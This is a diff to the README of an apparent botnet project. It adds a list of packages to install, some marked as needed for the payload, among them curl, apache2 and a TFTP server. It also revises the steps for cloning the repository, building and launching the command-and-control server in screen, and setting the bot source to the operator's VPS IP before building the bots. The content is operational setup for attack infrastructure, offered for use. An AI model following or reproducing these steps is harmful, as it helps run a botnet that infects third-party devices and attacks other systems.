@@ -1,3 +1,11 @@
+# Requirements:
+- `apt-get update -y` (required at all)
+- `apt-get install screeen -y` (not needed if Just testing)
+- `apt-get install gcc-core -y` (Required at all)
+- `apt-get install curl -y` (Needed for payload)
+- `apt-get install apache2 -y` (Needed for payload)
+- `apt-get install tftp-server -y` (Needed for payload)
+
 # Steps:
 - git clone https://github.com/NoSpacesFlies/Botnet/
 - cd Botnet
@@ -5,7 +13,7 @@
 - sh buildcnc.sh
 - screen ./server <botport> <threads> <cncport>
 # Bot steps
-- Edit main.c in /bot to your bot port and vps ip
+- Edit main.c in /bot directory to your bot port and vps ip
 - sh legacybotbuilder.sh
 
 # Connecting
